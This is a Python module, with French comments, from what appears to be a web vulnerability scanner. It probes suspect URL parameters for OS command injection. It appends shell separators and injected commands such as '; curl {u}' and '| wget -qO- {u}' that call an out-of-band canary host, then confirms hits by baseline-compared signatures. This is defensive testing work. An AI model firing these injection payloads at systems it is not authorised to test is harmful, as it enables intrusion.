"""
Module : Command Injection (OS).

Injection de séparateurs Unix/Windows (;, |, &&, ||, `, $()) sur les params
qui ressemblent à des commandes (cmd, exec, run, ping, host).

Détection : la signature du payload (catalogue command_injection.json : "uid=", "Linux",
"DOMAIN\\user", "Windows IP Configuration"...) doit apparaître dans la réponse au payload
ET être absente de la réponse baseline (même URL, valeur d'origine) — sinon la page la
contenait déjà et ce n'est pas une preuve d'exécution.

OWASP A03 / CWE-78.
"""
from __future__ import annotations
from typing import List, Dict, Any
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
import re

from scanner.core import http
from scanner.core.module_base import ScannerModule, Finding
from scanner.core.oob import OOBCanary
from scanner.payloads import get_payloads


class CommandInjectionModule(ScannerModule):
    name = "command-injection"
    category = "injection"
    title = "OS Command Injection"
    description = "Test d'injection de commandes shell sur params suspects."
    default_enabled = False

    SUSPECT_PARAMS = {"cmd", "command", "exec", "run", "ping", "host", "domain",
                      "ip", "target", "address", "shell", "lookup"}

    def scan(self, target: str, context: Dict[str, Any]) -> List[Finding]:
        # Une signature vide matcherait n'importe quelle page.
        payloads = [p for p in get_payloads("command_injection", depth=context.get("depth"))
                    if p.get("signature")]
        if not re.match(r"^https?://", target):
            return []
        findings: List[Finding] = []
        parsed = urlparse(target)
        params = dict(parse_qsl(parsed.query))

        for param_name, base_value in params.items():
            if param_name.lower() not in self.SUSPECT_PARAMS:
                continue

            # Référence propre : sans elle, impossible de confirmer (précision > rappel).
            try:
                base_r, _, _ = http.get(target, context, capture=True, timeout=8,
                                        headers={"User-Agent": "VulnScan/1.2"})
            except Exception:
                continue
            if base_r is None:
                continue

            # === Injection aveugle via rappel OOB (curl/wget vers le canary) ===
            canary = OOBCanary.new(context)
            if canary.url:
                for tmpl in ("; curl {u}", "| wget -qO- {u}", "& curl {u}", "`curl {u}`"):
                    np = dict(params)
                    np[param_name] = base_value + tmpl.format(u=canary.url)
                    try:
                        http.get(urlunparse(parsed._replace(query=urlencode(np))), context,
                                 timeout=8, headers={"User-Agent": "VulnScan/1.2"})
                    except Exception:
                        pass
                left = http.time_left(context)
                wait = 4 if left is None else min(4, left)
                if wait > 0 and canary.wait_for_hit(context, timeout=wait):
                    hit = canary.hits()[0] if canary.hits() else {}
                    findings.append(Finding(
                        type="command-injection", severity="critical",
                        title="Injection de commande OS aveugle confirmée via OOB",
                        description=(
                            f"Paramètre '{param_name}' : le serveur a exécuté une commande qui "
                            f"a appelé le canary {canary.url} (méthode {hit.get('method', '?')}). "
                            "Exploitable même sans retour visible."
                        ),
                        recommendation=(
                            "Ne JAMAIS passer une entrée utilisateur à shell_exec/exec/system. "
                            "Utiliser les APIs natives."
                        ),
                        url=target, parameter=param_name,
                        payload=f"{base_value}; curl {canary.url}",
                        evidence=f"Hit OOB : {hit.get('method')} from {hit.get('ip')} UA={hit.get('user_agent', '')[:60]}",
                        confidence=95, cwe_id="CWE-78", owasp_id="A03:2021", cvss_base=9.8,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        detection_method="oob-canary", source="module:command-injection",
                    ))
                    continue  # OOB prouvé pour ce param : inutile de fuzzer les signatures

            for entry in payloads:
                payload, sig = entry["payload"], entry["signature"]
                try:
                    new_params = dict(params)
                    new_params[param_name] = base_value + payload
                    test_url = urlunparse(parsed._replace(query=urlencode(new_params)))
                    r, req_ev, resp_ev = http.get(test_url, context, capture=True, timeout=8,
                                                   headers={"User-Agent": "VulnScan/1.2"})
                    if r is None:
                        continue
                    m = re.search(sig, r.text)
                    if m and not re.search(sig, base_r.text):
                        match_text = m.group(0)
                        findings.append(Finding(
                            type="command-injection", severity="critical",
                            title="Injection de commande OS confirmée",
                            description=(
                                f"Paramètre '{param_name}' permet d'exécuter des commandes shell. "
                                f"Signature observée : {match_text}"
                            ),
                            recommendation=(
                                "Ne JAMAIS passer une entrée utilisateur à shell_exec/exec/system. "
                                "Utiliser les APIs natives (ex: gethostbyname() au lieu de `ping`)."
                            ),
                            url=target, parameter=param_name,
                            payload=payload,
                            evidence=match_text,
                            confidence=entry.get("confidence_hint", 80),
                            cwe_id="CWE-78", owasp_id="A03:2021",
                            cvss_base=9.8,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                            detection_method="payload-signature",
                            source="module:command-injection",
                            evidence_request=req_ev, evidence_response=resp_ev,
                        ))
                        break
                except Exception:
                    continue
        return findings
